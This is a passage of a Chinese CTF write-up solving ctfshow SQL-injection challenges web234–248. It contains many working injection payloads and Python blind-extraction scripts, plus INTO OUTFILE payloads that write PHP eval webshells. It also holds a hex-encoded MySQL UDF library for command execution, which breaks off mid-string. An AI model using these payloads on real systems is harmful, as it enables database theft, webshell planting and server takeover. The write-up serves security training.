<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;$username&#x27;;&quot;;</span><br></pre></td></tr></table></figure>

<p>也就是这个才是’\‘ where username &#x3D; ‘pass那么后面的username自然就受我们控制了,比如我们这样闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;,username=select database()#&#x27;;&quot;;</span><br></pre></td></tr></table></figure>

<p>,username&#x3D;select database()#这一部分就是我们传入的username的值</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409115907938.png" alt="image-20220409115907938"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409115915740.png" alt="image-20220409115915740"></p>
<p>传数据库名的时候记得用十六进制哦 ‘’ 被过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#&amp;password=\</span><br></pre></td></tr></table></figure>

<h1 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h1><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409120324788.png" alt="image-20220409120324788"></p>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/134678.htm">概述MySQL统计信息</a>   <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysql之无列名注入</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409120619242.png" alt="image-20220409120611609"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409120634772.png" alt="image-20220409120634772"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#&amp;password=\</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=,username=(select `2` from(select 1,2,3 union select * from flag23a1 limit 1,1)a)#&amp;password=\</span><br></pre></td></tr></table></figure>

<h1 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409120851488.png" alt="image-20220409120851488"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409120950191.png" alt="image-20220409120950191"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409120958493.png" alt="image-20220409120958493"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409121038900.png" alt="image-20220409121038900"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409121050832.png" alt="image-20220409121050832"></p>
<h1 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h1><h2 id="inster注入"><a href="#inster注入" class="headerlink" title="inster注入"></a>inster注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409121236464.png" alt="image-20220409121236464"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=3&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&amp;password=1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409121533936.png" alt="image-20220409121533936"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409121540848.png" alt="image-20220409121540848"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=3&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;));-- A&amp;password=1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=3&#x27;,(select flagass23s3 from flag));-- A&amp;password=1</span><br></pre></td></tr></table></figure>

<h1 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409121935402.png" alt="image-20220409121935402"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=3&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#&amp;password=1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409122028791.png" alt="image-20220409122028791"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409122041955.png" alt="image-20220409122041955"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=3&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flagb&#x27;)));#&amp;password=1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=3&#x27;,(select(flag)from(flagb)));#&amp;password=1</span><br></pre></td></tr></table></figure>

<h1 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h1><h2 id="过滤or-空格"><a href="#过滤or-空格" class="headerlink" title="过滤or 空格"></a>过滤or 空格</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409123445710.png" alt="image-20220409123445710"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409123642991.png" alt="image-20220409123642991"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409123657096.png" alt="image-20220409123657096"></p>
<p>不会查列名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27;,(select(flag)from(flagbb)));#&amp;password=1</span><br></pre></td></tr></table></figure>

<h1 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409124924898.png" alt="image-20220409124924898"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d9a27e7b-ab91-4d9e-86c7-89a30a22acf3.challenge.ctf.show&quot;</span></span><br><span class="line">url_insert = url + <span class="string">&quot;/api/insert.php&quot;</span></span><br><span class="line">url_flag = url + <span class="string">&quot;/api/?page=1&amp;limit=1000&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 看命函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_str</span>():</span><br><span class="line">    sttr = <span class="string">&#x27;ab&#x27;</span></span><br><span class="line">    str_list = [random.choice(sttr) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">    random_str = <span class="string">&#x27;&#x27;</span>.join(str_list)</span><br><span class="line">    <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;1&#x27;,(select(flag)from(flag<span class="subst">&#123;generate_random_str()&#125;</span>)))#&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url_insert, data=data)</span><br><span class="line">    r2 = requests.get(url_flag)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> r2.json()[<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span>  <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> i[<span class="string">&#x27;pass&#x27;</span>]:</span><br><span class="line">                <span class="built_in">print</span>(i[<span class="string">&#x27;pass&#x27;</span>])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h1><h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409125442979.png" alt="image-20220409125442979"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:feng</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://224c4817-ece7-46e4-a9a5-185fdce4e641.chall.ctf.show:8080/api/delete.php&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        j=<span class="built_in">min</span>+(<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span>==j:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload=&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.01),1)&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment">#payload=&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.01),1)&quot;.format(i,j)</span></span><br><span class="line">        payload=<span class="string">&quot;if(ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.01),1)&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url=url,data=data,timeout=<span class="number">0.2</span>)</span><br><span class="line">            <span class="built_in">min</span>=j</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">max</span>=j</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h1><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409131541223.png" alt="image-20220409131541223"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ... INTO OUTFILE &#x27;file_name&#x27;</span><br><span class="line">        [CHARACTER SET charset_name]</span><br><span class="line">        [export_options]</span><br><span class="line"></span><br><span class="line">export_options:</span><br><span class="line">    [&#123;FIELDS | COLUMNS&#125;</span><br><span class="line">        [TERMINATED BY &#x27;string&#x27;]//分隔符</span><br><span class="line">        [[OPTIONALLY] ENCLOSED BY &#x27;char&#x27;]</span><br><span class="line">        [ESCAPED BY &#x27;char&#x27;]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING BY &#x27;string&#x27;]</span><br><span class="line">        [TERMINATED BY &#x27;string&#x27;]</span><br><span class="line">    ]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">“OPTION”参数为可选参数选项，其可能的取值有：</span><br><span class="line"></span><br><span class="line">`FIELDS TERMINATED BY &#x27;字符串&#x27;`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。</span><br><span class="line"></span><br><span class="line">`FIELDS ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">`FIELDS OPTIONALLY ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">`FIELDS ESCAPED BY &#x27;字符&#x27;`：设置转义字符，只能为单个字符。默认值为“\”。</span><br><span class="line"></span><br><span class="line">`LINES STARTING BY &#x27;字符串&#x27;`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</span><br><span class="line"></span><br><span class="line">`LINES TERMINATED BY &#x27;字符串&#x27;`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>FIELDS TERMINATED BY</li>
<li>LINES STARTING BY</li>
<li>LINES TERMINATED BY</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=1.php&#x27; fields terminated by &#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;#</span><br></pre></td></tr></table></figure>

<p>接着访问dump&#x2F;1.php</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409131756459.png" alt="image-20220409131756459"></p>
<h1 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409131947051.png" alt="image-20220409131947051"></p>
<p>有index.php,上传.user.ini,不过要注意一下上传的格式</p>
<p>过滤了php，那么使用.user.ini进行文件包含，传入一个图片马，再使index.php包含图片马即可。具体操作如下：<br>先上传.user.ini(其中在每行开头加了;用于注释掉从表ctfshow_user中读出的内容)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=.user.ini&#x27; LINES STARTING BY &#x27;;&#x27; TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653d7a662e6a70670a#</span><br></pre></td></tr></table></figure>

<p>.user.ini的结果类似于：</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409132736975.png" alt="image-20220409132736975"></p>
<p>再上传图片马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=zf.jpg&#x27; lines starting by &#x27;&lt;?=eval($_POST[zf]);?&gt;&#x27;#</span><br></pre></td></tr></table></figure>

<h1 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h1><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409132921712.png" alt="image-20220409132921712"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409132917871.png" alt="image-20220409132917871"></p>
<p>extractvalue()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>updatexml()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id=1&#x27; or updatexml(1,concat(1,(database())),1) -- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>floor()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>ceil()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>round()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,round(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>都试一下咯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模板</span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(1,([])),1) -- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) -- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">字段名</span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flag&#x27;)),1) -- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">数据 分开读</span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(1,(select left(flag,30) from ctfshow_flag)),1) -- #&amp;page=1&amp;limit=10		ctfshow&#123;35d09f15-bd71-4970-90c</span><br><span class="line">/api/?id=1&#x27; or updatexml(1,concat(1,(select right(flag,27) from ctfshow_flag)),1) -- #&amp;page=1&amp;limit=10			d71-4970-90ca-56b17f14ccb0&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409135233790.png" alt="image-20220409135233790"></p>
<h1 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409135326914.png" alt="image-20220409135326914"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模板</span><br><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,([]),0x7e))-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">字段名</span><br><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27;),0x7e))-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">数据 分开读</span><br><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,(select left(flag1,30) from ctfshow_flagsa),0x7e))-- #&amp;page=1&amp;limit=10			ctfshow&#123;1232f3e3-1688-483c-a48</span><br><span class="line">api/?id=1&#x27; and extractvalue(1,concat(0x7e,(select right(flag1,30) from ctfshow_flagsa),0x7e))-- #&amp;page=1&amp;limit=10			3-1688-483c-a483-990657e35c81&#125;</span><br></pre></td></tr></table></figure>

<h1 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409135940440.png" alt="image-20220409135940440"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模板</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,([]),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">字段名</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#x27;ctfshow_flags&#x27; limit 1,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">数据</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select flag2 from ctfshow_flags),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<h1 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220409140732039.png" alt="image-20220409140732039"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,round(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模板</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,([]),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">字段名</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagsa&#x27; limit 1,1),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br><span class="line"></span><br><span class="line">数据</span><br><span class="line">/api/?id=1&#x27; union Select 1,count(*),concat(0x3a,0x3a,(select `flag?` from ctfshow_flagsa),0x3a,0x3a,ceil(rand(0)*2)) as a from information_schema.columns group by a-- #&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>可以看到这个字段名<code>flag?</code>加了反引号，原因是：表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字段.表名、字段名、数据库名等可用反引号 ( &#96; )，也可以不使用反引号 ，但如果它包含特殊字符或保留字，则必须使用，如果不使用就会报错</p>
<h1 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h1><h2 id="udf注入"><a href="#udf注入" class="headerlink" title="udf注入"></a>udf注入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#参考脚本</span></span><br><span class="line"><span class="comment">#环境：Linux/MariaDB</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;http://89a7098e-03f5-47f3-9cb5-1f1cd3d640e9.challenge.ctf.show:8080/api/?id=&#x27;</span></span><br><span class="line">code=<span class="string">&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0